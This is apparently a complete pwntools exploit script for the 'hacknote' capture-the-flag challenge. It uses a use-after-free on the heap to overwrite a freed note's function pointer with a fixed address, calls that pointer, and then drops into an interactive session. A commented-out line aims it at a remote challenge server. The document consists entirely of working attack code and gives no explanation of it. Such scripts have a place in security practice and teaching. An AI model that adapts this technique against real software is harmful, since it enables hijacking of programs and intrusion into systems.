from pwn import*
context(os='linux',arch='i386',log_level='debug')
# r=remote('node5.buuoj.cn',25922)
r=process('./hacknote')
#note0
r.recvuntil(b'Your choice :')
# gdb.attach(r)
# pause()
r.sendline(b'1')
r.recvuntil(b'Note size :')
r.sendline(b'32')
r.recvuntil(b'Content :')
r.sendline(b'aaaa')
#note1
r.recvuntil(b'Your choice :')
r.sendline(b'1')
r.recvuntil(b'Note size :')
r.sendline(b'32')
r.recvuntil(b'Content :')
r.sendline(b'aaaa')

r.recvuntil(b'Your choice :')
r.sendline(b'2')
r.recvuntil(b'Index :')
r.sendline(b'0')

r.recvuntil(b'Your choice :')
r.sendline(b'2')
r.recvuntil(b'Index :')
r.sendline(b'1')

#note2

r.recvuntil(b'Your choice :')
r.sendline(b'1')
r.recvuntil(b'Note size :')
r.sendline(b'8')
r.recvuntil(b'Content :')
r.sendline(p32(0x08048986))

r.recvuntil(b'Your choice :')
r.sendline(b'3')
r.recvuntil(b'Index :')
pause()
r.sendline(b'0')
r.interactive()

